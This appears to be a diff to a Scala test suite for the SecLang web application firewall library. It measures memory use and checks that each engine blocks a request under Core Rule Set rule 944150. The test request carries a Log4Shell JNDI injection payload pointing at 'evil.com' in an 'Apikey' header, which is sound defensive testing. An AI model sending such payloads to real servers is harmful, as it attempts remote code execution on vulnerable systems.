@@ -6,6 +6,9 @@ import com.cloud.apim.seclang.model._
 import com.cloud.apim.seclang.scaladsl.{SecLang, SecLangPresets}
 import squants.information.Bytes
 
+import java.io.File
+import java.nio.file.Files
+
 class SecLangFactoryTest extends munit.FunSuite {
 
   test("simple factory test") {
@@ -185,6 +188,7 @@ class SecLangFactorySizeTest extends munit.FunSuite {
       ),
     )
     val factory = SecLang.factory(Map("crs" -> crs), integration = DefaultNoCacheSecLangIntegration.default)
+    // val factory = SecLang.factory(Map("crs" -> crs), integration = DefaultSecLangIntegration.default)
     val rulesConfig = List(
       "@import_preset crs",
       "SecRuleEngine On"
@@ -192,14 +196,30 @@ class SecLangFactorySizeTest extends munit.FunSuite {
 
     println(s"factory preset: ${Bytes(org.openjdk.jol.info.GraphLayout.parseInstance(crs).totalSize()).toMegabytes} Mb")
     println(s"factory 1: ${Bytes(org.openjdk.jol.info.GraphLayout.parseInstance(factory).totalSize()).toMegabytes} Mb")
+    val failing_ctx = RequestContext(
+      method = "GET",
+      uri = "/",
+      headers = Headers(Map(
+        "Host" -> List("www.foo.bar"),
+        "Apikey" -> List("${jndi:ldap://evil.com/a}"),
+        "User-Agent" -> List("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"),
+      )),
+      query = Map("q" -> List("test")),
+      body = None
+    )
     var engines = List.empty[SecLangEngine]
-    for (i <- 1 to 10000) {
+    for (i <- 1 to 1000) {
       val e = factory.engine(rulesConfig)
       engines = engines :+ e
     }
     println(s"factory 2: ${Bytes(org.openjdk.jol.info.GraphLayout.parseInstance(factory).totalSize()).toMegabytes} Mb")
     println(s"enginesSize size: ${Bytes(org.openjdk.jol.info.GraphLayout.parseInstance(engines).totalSize()).toMegabytes} Mb")
-
+    engines.foreach { e =>
+      val r = e.evaluate(failing_ctx, List(1, 2))
+      assertEquals(r.disposition, Block(400, Some("Potential Remote Command Execution: Log4j / Log4shell"), Some(944150)))
+    }
+    println(s"factory 2: ${Bytes(org.openjdk.jol.info.GraphLayout.parseInstance(factory).totalSize()).toMegabytes} Mb")
+    println(s"enginesSize size: ${Bytes(org.openjdk.jol.info.GraphLayout.parseInstance(engines).totalSize()).toMegabytes} Mb")
     val e = SecLang.engine(SecLang.compile(SecLang.parse("SecRuleEngine On").right.get), integration = DefaultNoCacheSecLangIntegration.default)
     println(s"simple engine size: ${Bytes(org.openjdk.jol.info.GraphLayout.parseInstance(e).totalSize()).toKilobytes} Kb")
   }
